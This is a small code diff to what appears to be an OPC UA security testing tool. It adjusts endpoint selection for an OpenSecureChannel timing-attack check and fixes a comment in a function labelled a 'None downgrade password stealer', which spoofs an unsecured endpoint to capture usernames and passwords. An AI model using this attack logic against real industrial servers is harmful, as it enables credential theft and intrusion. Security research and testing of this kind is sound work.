@@ -1431,7 +1431,7 @@ def server_checker(url : str, test_timing_attack : bool):
     
   if test_timing_attack:
     if not pkcs1_ep:
-      i, pkcs1_ep = max(enumerate(endpoints, start=1), key=lambda i_ep: i_ep[1].securityPolicyUri != SecurityPolicy.NONE)
+      i, pkcs1_ep = max(enumerate(endpoints, start=1), key=lambda i_ep: [i_ep[1].transportProfileUri.endswith('uatcp-uasc-uabinary'), i_ep[1].securityPolicyUri != SecurityPolicy.NONE])
       log(f'No endpoint advertising Basic128Rsa15. Trying Endpoint #{i} with policy {pkcs1_ep.securityPolicyUri.value} instead.')
     
     log('Testing OpenSecureChannel timing attack...')
@@ -1614,7 +1614,7 @@ def client_attack(
 # None downgrade password stealer.
 def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:  
   # Make a spoofed endpoint with None security that only accepts passwords. 
-  # Base this on an existing endpoints, preferably those similar to what we want.
+  # Base this on an existing endpoint, preferably those similar to what we want.
   spoofed_ep = max(server_eps, key=lambda ep: ep.securityPolicyUri == SecurityPolicy.NONE)
   spoofed_policy = max(spoofed_ep.userIdentityTokens, default=None, key=lambda p: p.tokenType == UserTokenType.USERNAME)
   if not spoofed_policy or spoofed_policy.tokenType != UserTokenType.USERNAME:
